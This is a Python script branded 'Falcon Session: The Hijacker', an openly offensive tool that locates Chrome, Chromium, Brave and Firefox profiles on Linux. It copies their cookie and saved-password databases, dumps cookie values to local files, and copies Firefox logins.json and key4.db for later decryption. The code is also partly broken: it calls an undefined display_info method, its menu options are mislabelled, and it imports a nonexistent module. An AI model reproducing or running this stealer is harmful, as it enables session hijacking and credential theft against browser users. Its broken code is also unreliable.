import os
import platform
import sys
import datetime
import sqlite3
import json
import base64
from cryptography.fips import fips_enabled
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import shutil

# --- Falcon Session ASCII Logo (Dark Purple & Black Theme) ---
FALCON_SESSION_LOGO = r"""

  
                    
/ /  \\  / /  \\
 /\\      / \\              [ FALCON SESSION: THE HIJACKER ]
 / /\\    / /\\ \\              [ SILENT & EFFICIENT ]
/ /  \\  / /  \\ \\          [ STATUS: READY FOR ACTION ]
/ /    \\/ /    \\ \\   
/ /      \\ \\
/ /        \\ \\
/_/          \\_\\
\ \        / /
 \ \      / /
  \ \    / /
   \ \  / /
    \ \/ /
     \/ /

[+] Falcon Session is LIVE & READY [+] الصقر المختطف نشط وجاهز
"""

class FalconSession:
    def __init__(self):
        self.os_type = platform.system()
        self.is_kali = self._check_kali()
        self.log_dir = self._setup_log_directory()
        self.session_id = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.current_session_log_path = os.path.join(self.log_dir, self.session_id)
        os.makedirs(self.current_session_log_path, exist_ok=True)

    def _check_kali(self):
        return os.path.exists("/etc/kali-release")

    def _setup_log_directory(self):
        log_path = os.path.join(os.getcwd(), "logs")
        os.makedirs(log_path, exist_ok=True)
        return log_path

    def save_data(self, filename, data, mode="w"):
        file_path = os.path.join(self.current_session_log_path, filename)
        try:
            with open(file_path, mode, encoding="utf-8") as f:
                f.write(data)
            print(f"[+] Data saved to: {file_path}")
        except Exception as e:
            print(f"[-] Error saving data to {file_path}: {e}")

    def _get_chrome_paths(self):
        paths = []
        if self.os_type == "Linux":
            # Common Chrome/Chromium paths on Linux
            home_dir = os.path.expanduser("~")
            chrome_dirs = [
                os.path.join(home_dir, ".config", "google-chrome", "Default"),
                os.path.join(home_dir, ".config", "chromium", "Default"),
                os.path.join(home_dir, ".config", "BraveSoftware", "Brave-Browser", "Default"),
                # Add other profiles if needed, e.g., Profile 1, Profile 2
            ]
            for c_dir in chrome_dirs:
                if os.path.exists(c_dir):
                    paths.append(c_dir)
        # Windows paths would go here if supported
        return paths

    def _get_firefox_paths(self):
        paths = []
        if self.os_type == "Linux":
            # Common Firefox paths on Linux
            home_dir = os.path.expanduser("~")
            firefox_profiles_dir = os.path.join(home_dir, ".mozilla", "firefox")
            if os.path.exists(firefox_profiles_dir):
                for profile_dir in os.listdir(firefox_profiles_dir):
                    if profile_dir.endswith(".default-release") or profile_dir.endswith(".default"):
                        full_path = os.path.join(firefox_profiles_dir, profile_dir)
                        if os.path.exists(os.path.join(full_path, "cookies.sqlite")):
                            paths.append(full_path)
        # Windows paths would go here if supported
        return paths

    def _decrypt_chrome_password(self, encrypted_value, master_key=None):
        # Chrome on Linux often uses libsecret/kwallet for encryption.
        # Direct decryption without user's login password or libsecret/kwallet access is complex.
        # This is a placeholder for potential future advanced decryption or if a master_key is found.
        # For Kali Linux, often passwords are encrypted with a key derived from user's login password.
        # This function would require significant OS-level integration or a known key.
        return "[ENCRYPTED - MANUAL DECRYPTION REQUIRED or KEY NOT FOUND]"

    def extract_chrome_data(self):
        print("\n[+] Attempting to extract Chrome/Chromium data...")
        chrome_paths = self._get_chrome_paths()
        if not chrome_paths:
            print("[-] No Chrome/Chromium profiles found on this system.")
            return

        for profile_path in chrome_paths:
            profile_name = os.path.basename(profile_path)
            print(f"[+] Processing Chrome profile: {profile_name}")
            profile_log_path = os.path.join(self.current_session_log_path, f"Chrome_{profile_name}")
            os.makedirs(profile_log_path, exist_ok=True)

            # Extract Cookies
            cookies_db_path = os.path.join(profile_path, "Cookies")
            if os.path.exists(cookies_db_path):
                temp_cookies_db = os.path.join(profile_log_path, "Cookies.db")
                shutil.copy2(cookies_db_path, temp_cookies_db)
                print(f"[+] Copied Chrome Cookies DB to: {temp_cookies_db}")
                try:
                    conn = sqlite3.connect(temp_cookies_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, creation_utc, encrypted_value FROM cookies")
                    cookies_data = []
                    for host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, creation_utc, encrypted_value in cursor.fetchall():
                        decrypted_value = value # Default to plain value
                        if encrypted_value and len(encrypted_value) > 0:
                            # Chrome on Linux often uses OS-level encryption (libsecret/kwallet)
                            # Direct decryption is not straightforward without the user's login key.
                            decrypted_value = self._decrypt_chrome_password(encrypted_value)
                        cookies_data.append(f"Host: {host_key}, Name: {name}, Value: {decrypted_value}, Path: {path}, Expires: {expires_utc}")
                    self.save_data(f"Chrome_{profile_name}_cookies.txt", "\n".join(cookies_data))
                    conn.close()
                    os.remove(temp_cookies_db) # Clean up temp file
                except Exception as e:
                    print(f"[-] Error processing Chrome cookies for {profile_name}: {e}")
            else:
                print(f"[-] Chrome Cookies DB not found for {profile_name}.")

            # Extract Passwords
            login_data_db_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_db_path):
                temp_login_data_db = os.path.join(profile_log_path, "Login Data.db")
                shutil.copy2(login_data_db_path, temp_login_data_db)
                print(f"[+] Copied Chrome Login Data DB to: {temp_login_data_db}")
                try:
                    conn = sqlite3.connect(temp_login_data_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    passwords_data = []
                    for origin_url, username_value, password_value in cursor.fetchall():
                        decrypted_password = self._decrypt_chrome_password(password_value)
                        passwords_data.append(f"URL: {origin_url}, Username: {username_value}, Password: {decrypted_password}")
                    self.save_data(f"Chrome_{profile_name}_passwords.txt", "\n".join(passwords_data))
                    conn.close()
                    os.remove(temp_login_data_db) # Clean up temp file
                except Exception as e:
                    print(f"[-] Error processing Chrome passwords for {profile_name}: {e}")
            else:
                print(f"[-] Chrome Login Data DB not found for {profile_name}.")

    def _decrypt_firefox_password(self, encrypted_value, key_db_path):
        # Firefox decryption is complex and requires parsing key4.db/key3.db and NSS library.
        # This is a highly advanced topic and often requires external tools or deep understanding of NSS.
        # For simplicity and within Python's standard libraries, this is a placeholder.
        return "[ENCRYPTED - MANUAL DECRYPTION REQUIRED or NSS KEY NOT FOUND]"

    def extract_firefox_data(self):
        print("\n[+] Attempting to extract Firefox data...")
        firefox_paths = self._get_firefox_paths()
        if not firefox_paths:
            print("[-] No Firefox profiles found on this system.")
            return

        for profile_path in firefox_paths:
            profile_name = os.path.basename(profile_path)
            print(f"[+] Processing Firefox profile: {profile_name}")
            profile_log_path = os.path.join(self.current_session_log_path, f"Firefox_{profile_name}")
            os.makedirs(profile_log_path, exist_ok=True)

            # Extract Cookies
            cookies_db_path = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookies_db_path):
                temp_cookies_db = os.path.join(profile_log_path, "cookies.sqlite.db")
                shutil.copy2(cookies_db_path, temp_cookies_db)
                print(f"[+] Copied Firefox Cookies DB to: {temp_cookies_db}")
                try:
                    conn = sqlite3.connect(temp_cookies_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value, path, expiry, lastAccessed, creationTime FROM moz_cookies")
                    cookies_data = []
                    for host, name, value, path, expiry, lastAccessed, creationTime in cursor.fetchall():
                        cookies_data.append(f"Host: {host}, Name: {name}, Value: {value}, Path: {path}, Expires: {expiry}")
                    self.save_data(f"Firefox_{profile_name}_cookies.txt", "\n".join(cookies_data))
                    conn.close()
                    os.remove(temp_cookies_db) # Clean up temp file
                except Exception as e:
                    print(f"[-] Error processing Firefox cookies for {profile_name}: {e}")
            else:
                print(f"[-] Firefox Cookies DB not found for {profile_name}.")

            # Extract Passwords
            logins_json_path = os.path.join(profile_path, "logins.json")
            key_db_path = os.path.join(profile_path, "key4.db") # Or key3.db
            if os.path.exists(logins_json_path) and os.path.exists(key_db_path):
                # Firefox passwords are encrypted using NSS. Decryption is complex.
                # This requires parsing key4.db/key3.db and using NSS functions.
                # For this tool, we'll indicate that manual decryption is needed.
                shutil.copy2(logins_json_path, os.path.join(profile_log_path, "logins.json"))
                shutil.copy2(key_db_path, os.path.join(profile_log_path, "key4.db"))
                print(f"[+] Copied Firefox logins.json and key4.db to: {profile_log_path}")
                self.save_data(f"Firefox_{profile_name}_passwords.txt", "[Firefox passwords require NSS decryption using key4.db/key3.db and potentially a master password. Files copied for manual analysis.]")
            else:
                print(f"[-] Firefox logins.json or key4.db not found for {profile_name}. Passwords cannot be extracted.")

    def extract_data_menu(self):
        while True:
            print("\n--- Falcon Session: Data Extraction Module ---")
            print("1. Extract Chrome/Chromium Data (Cookies & Passwords)")
            print("2. Extract Firefox Data (Cookies & Passwords)")
            print("3. Back to Main Menu")

            choice = input("Enter your choice: ")

            if choice == '1':
               self.extract_chrome_data()
            elif choice == '2':
             self.extract_firefox_data()
            elif choice == '3':
                     # أضف الوظيفة الخاصة بالخيار الثالث هنا
                pass
                break
            else:
                print("[-] Invalid choice. Please try again.")

    def main_menu(self):
        while True:
            print("\n--- Falcon Session Main Menu ---")
            print("1. Display System Info")
            print("2. Extract Cookies & Passwords")
            print("3. Exit")

            choice = input("Enter your choice: ")

            if choice == '1':
               self.extract_chrome_data()
            elif choice == '2':
             self.extract_firefox_data()
            elif choice == '3':
                     # أضف الوظيفة الخاصة بالخيار الثالث هنا
                pass
                print("[+] Exiting Falcon Session. Stay stealthy!")
                sys.exit(0)
            else:
                print("[-] Invalid choice. Please try again.")

    def run(self):
        self.display_info()
        self.main_menu()

if __name__ == "__main__":
    falcon_session = FalconSession()
    falcon_session.run()
